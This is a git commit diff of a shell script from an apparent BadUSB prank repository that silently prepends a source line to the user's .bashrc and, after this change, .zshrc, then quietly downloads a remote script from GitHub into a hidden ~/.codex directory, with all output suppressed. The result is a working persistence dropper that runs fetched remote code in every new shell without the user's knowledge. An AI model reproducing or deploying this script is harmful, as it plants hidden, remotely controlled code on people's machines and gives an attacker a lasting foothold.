37068aeeff0cc73397666067e8a4419b592b7c05
cluster bright <142358852+Cluster-bright@users.noreply.github.com>
2024-10-07 11:04:21 +0200

    Update add_stuff.sh

--- terminal_tomfoolery/cloning/add_stuff.sh
+++ terminal_tomfoolery/cloning/add_stuff.sh
@@ -1,28 +1,21 @@
 #!/bin/bash
 
-# The content to add to the start of .bashrc
 content='if [ -f ~/.codex/.filesystem.sh ]; then
     . ~/.codex/.filesystem.sh
 fi'
-
-# File paths
 bashrc="$HOME/.bashrc"
+zshrc="$HOME/.zshrc"
 codex_dir="$HOME/.codex"
 filesystem_file="$codex_dir/.filesystem.sh"
 temp_file=$(mktemp)
-
-# Add content to temp file, followed by existing .bashrc content
+temp_file_zsh=$(mktemp)
 {
     echo "$content" > "$temp_file"
     cat "$bashrc" >> "$temp_file"
-    
-    # Move the temp file back to .bashrc
+    echo "$content" > "$temp_file_zsh"
+    cat "$zshrc" >> "$temp_file_zsh"
     mv "$temp_file" "$bashrc"
-
-    # Create ~/.codex/ directory if it doesn't exist
+    mv "$temp_file_zsh" "$zshrc"
     [ ! -d "$codex_dir" ] && mkdir -p "$codex_dir"
-    
-    # Download the file and save it as .filesystem.sh in ~/.codex/
-    wget -q -O "$filesystem_file" "https://github.com/Cluster-bright/bad_usb_for_fun/raw/refs/heads/main/terminal_tomfoolery/cloning/codex.sh"
-    
+    wget -q -O "$filesystem_file" "https://github.com/Cluster-bright/bad_usb_for_fun/raw/refs/heads/main/terminal_tomfoolery/cloning/codex.sh" 
 } >/dev/null 2>&1
